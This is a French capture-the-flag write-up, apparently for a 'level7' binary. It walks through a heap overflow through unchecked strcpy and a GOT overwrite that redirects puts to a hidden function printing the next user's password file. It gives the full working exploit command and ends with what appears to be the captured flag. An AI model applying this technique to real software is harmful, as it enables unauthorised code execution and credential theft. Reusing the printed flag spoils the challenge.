L'exécutable demande 2 arguments, les 2 arguments vont être stockés dans 2 variables différentes via des strcpy.
Les strcpy ne sont pas protégés donc on peux supposer qu'un buffer overflow sera utilisé.


Analysons le main.
4 malloc sont effectués afin de préparer les arguments pour les strcpy
arg1 est copier dans 0x0804a018
arg2 est copier dans 0x0804a038
puis le fichier .pass de l'user8 est ouvert et le contenu est enregistré dans une variable à l'adresse 0x8049960
enfin la fonction fini par un appel à puts@plt qui imprime "~~"

Via info functions dans gdb on remarque une fonction m non utilisée à l'adresse 0x080484f4 qui print le résultat de la fonction time ET notre variable 0x8049960 qui contient le .pass
On souhaite donc exécuter la fonction m après l'appel du fopen dans main

On peux supposer que l'appel de puts@plt est vulnérable en utilisant un overwrite du GOT en remplacant l'adresse de puts() par m()
Etant donné que malloc est utilisé pour les arguments des strcpy regardons leurs adresses via  ltrace
--ltrace ./level7 aaaa aaaa
malloc(8)                    = 0x0804a008 (1)
malloc(8)                    = 0x0804a018 (2)
malloc(8)                    = 0x0804a028 (3)
malloc(8)                    = 0x0804a038 (4)
strcpy(0x0804a018, "aaaa")   = 0x0804a018 (1 -> 2)
strcpy(0x0804a038, "aaaa")   = 0x0804a038 (3 -> 4)

si on segfault en aggrandissant (1) on remarque:
--ltrace ~/level7 aaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaa
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa")  = 0x0804a018
strcpy(0x61616161, "aaaa" <unfinished ...>

Le programme segfault car notre argument (1) stocké à 0x0804a008 a overwrite notre argument (3) à 0x0804a028

En trouvant l'offset ( qui est de 0x20 ) on peut manipuler l'adresse de destination du 2ème strcpy afin d'y mettre ce que l'on souhaite grace à (4) à l'adresse 0x0804a038

Encore une fois utilisons des pattern pour trouver l'offset et nous simplifier la vie:
-- ltrace ~/level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab AAAA
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
strcpy(0x37614136, "AAAA" <unfinished ...>

0x37614136 --> 20

vérifions cela
-- ltrace ./level7 `python -c "print('A'*20 + 'BBBB')"` AAAA
strcpy(0x42424242, "AAAA" <unfinished ...>

Cela fonctionne, maintenant nous pouvons chercher l'adresse où est stockée notre fonction puts et la remplacer par notre fonction m

-- readelf -r ./level7
08049928  00000607 R_386_JUMP_SLOT   00000000   puts

0x08049928 est notre emplacement et l'addresse de m est 0x080484f4

Maintenant que nous avons tous nous pouvons essayer d'exécuter m
-- ./level7 `python -c "print('A'*20 + '\x28\x99\x04\x08')"` `python -c "print('\xf4\x84\x04\x08')"`

5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

